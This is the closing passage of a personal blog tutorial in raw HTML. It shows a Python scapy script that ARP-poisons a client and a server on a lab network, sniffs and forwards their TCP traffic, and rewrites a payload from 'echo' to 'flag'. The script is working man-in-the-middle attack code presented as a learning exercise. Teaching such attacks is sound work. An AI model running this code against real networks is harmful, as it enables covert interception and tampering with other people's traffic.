punctuation">.</span>attacker_mac <span class="token operator">=</span> get_if_hwaddr<span class="token punctuation">(</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><br>        self<span class="token punctuation">.</span>client_ip <span class="token operator">=</span> <span class="token string">"10.0.0.2"</span><br>        self<span class="token punctuation">.</span>server_ip <span class="token operator">=</span> <span class="token string">"10.0.0.3"</span><br><br>        <span class="token comment"># Get real MAC addresses</span><br>        self<span class="token punctuation">.</span>client_mac <span class="token operator">=</span> self<span class="token punctuation">.</span>get_mac<span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_ip<span class="token punctuation">)</span><br>        self<span class="token punctuation">.</span>server_mac <span class="token operator">=</span> self<span class="token punctuation">.</span>get_mac<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server_ip<span class="token punctuation">)</span><br><br>        <span class="token comment"># Start ARP poisoning</span><br>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>arp_poison<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>        <span class="token comment"># Manually forward packets</span><br>        self<span class="token punctuation">.</span>forward_packets<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>    <span class="token keyword">def</span> <span class="token function">get_mac</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        ans<span class="token punctuation">,</span> _ <span class="token operator">=</span> srp<span class="token punctuation">(</span><br>            Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span> <span class="token operator">/</span> ARP<span class="token punctuation">(</span>pdst<span class="token operator">=</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><br>        <span class="token punctuation">)</span><br>        <span class="token keyword">return</span> ans<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc <span class="token keyword">if</span> ans <span class="token keyword">else</span> <span class="token boolean">None</span><br><br>    <span class="token keyword">def</span> <span class="token function">arp_poison</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            send<span class="token punctuation">(</span><br>                ARP<span class="token punctuation">(</span><br>                    op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><br>                    pdst<span class="token operator">=</span>self<span class="token punctuation">.</span>client_ip<span class="token punctuation">,</span><br>                    hwdst<span class="token operator">=</span>self<span class="token punctuation">.</span>client_mac<span class="token punctuation">,</span><br>                    psrc<span class="token operator">=</span>self<span class="token punctuation">.</span>server_ip<span class="token punctuation">,</span><br>                    hwsrc<span class="token operator">=</span>self<span class="token punctuation">.</span>attacker_mac<span class="token punctuation">,</span><br>                <span class="token punctuation">)</span><span class="token punctuation">,</span><br>                verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span><br>            <span class="token punctuation">)</span><br>            send<span class="token punctuation">(</span><br>                ARP<span class="token punctuation">(</span><br>                    op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><br>                    pdst<span class="token operator">=</span>self<span class="token punctuation">.</span>server_ip<span class="token punctuation">,</span><br>                    hwdst<span class="token operator">=</span>self<span class="token punctuation">.</span>server_mac<span class="token punctuation">,</span><br>                    psrc<span class="token operator">=</span>self<span class="token punctuation">.</span>client_ip<span class="token punctuation">,</span><br>                    hwsrc<span class="token operator">=</span>self<span class="token punctuation">.</span>attacker_mac<span class="token punctuation">,</span><br>                <span class="token punctuation">)</span><span class="token punctuation">,</span><br>                verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span><br>            <span class="token punctuation">)</span><br>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><br><br>    <span class="token keyword">def</span> <span class="token function">forward_packets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">def</span> <span class="token function">process</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span><br>            <span class="token keyword">if</span> IP <span class="token keyword">in</span> pkt <span class="token keyword">and</span> TCP <span class="token keyword">in</span> pkt<span class="token punctuation">:</span><br>                <span class="token comment"># Client -> Server</span><br>                <span class="token keyword">if</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">==</span> self<span class="token punctuation">.</span>client_ip <span class="token keyword">and</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">==</span> self<span class="token punctuation">.</span>server_ip<span class="token punctuation">:</span><br><br>                    <span class="token comment"># Modify payload if needed</span><br>                    <span class="token keyword">if</span> Raw <span class="token keyword">in</span> pkt<span class="token punctuation">:</span><br>                        data <span class="token operator">=</span> pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<br>                        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">b"echo"</span><span class="token punctuation">:</span><br>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"data from client to server"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><br>                            pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load <span class="token operator">=</span> <span class="token string">b"flag"</span><br><br>                    <span class="token comment"># Forward to server</span><br>                    pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">=</span> self<span class="token punctuation">.</span>attacker_mac<br>                    pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">=</span> self<span class="token punctuation">.</span>server_mac<br>                    <span class="token keyword">del</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>chksum<br>                    <span class="token keyword">del</span> pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>chksum<br>                    sendp<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><br><br>                <span class="token comment"># Server -> Client</span><br>                <span class="token keyword">elif</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">==</span> self<span class="token punctuation">.</span>server_ip <span class="token keyword">and</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">==</span> self<span class="token punctuation">.</span>client_ip<span class="token punctuation">:</span><br>                    <span class="token comment"># Forward to client</span><br>                    <span class="token keyword">if</span> Raw <span class="token keyword">in</span> pkt<span class="token punctuation">:</span><br>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"data from server to client"</span><span class="token punctuation">,</span> pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">)</span><br>                    pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">=</span> self<span class="token punctuation">.</span>attacker_mac<br>                    pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">=</span> self<span class="token punctuation">.</span>client_mac<br>                    <span class="token keyword">del</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>chksum<br>                    <span class="token keyword">del</span> pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>chksum<br>                    sendp<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><br><br>        sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>process<span class="token punctuation">,</span> store<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><br><br><br>attacker <span class="token operator">=</span> AttackerHost<span class="token punctuation">(</span><span class="token punctuation">)</span><br>attacker<span class="token punctuation">.</span>entrypoint<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>Now you will be able to see the data packets between them.</li></ul><p>Hurray!! You have learned something new. If you are not able to understand some of the code, check the <strong>scapy</strong> documentation.</p><p>I keep tweeting, writing and learning concepts like this. Feel free to reach out via DMs if facing any difficulty or want to discuss something with me.</p><p>Follow me for more such content. Happy Learning..</p><p class="tag-list"><a class="tag" href="/portfolio/tags/cybersecurity/" rel="tag">cybersecurity</a> <a class="tag" href="/portfolio/tags/infosec/" rel="tag">infosec</a> <a class="tag" href="/portfolio/tags/linux/" rel="tag">linux</a> <a class="tag" href="/portfolio/tags/python/" rel="tag">python</a> <a class="tag" href="/portfolio/tags/scapy/" rel="tag">scapy</a></p></article><nav><a href="/portfolio/blog/">â† View All Articles</a></nav></div></main><footer class="site-footer"><medium>Connect with me on <a href="https://x.com/bbetterengineer" target="_blank">X</a>, <a href="https://github.com/ayush-garg341" target="_blank">GitHub</a> or <a href="https://www.linkedin.com/in/ayush-garg-5bb04114b/" target="_blank">Linkedin</a>.</medium></footer></body></html>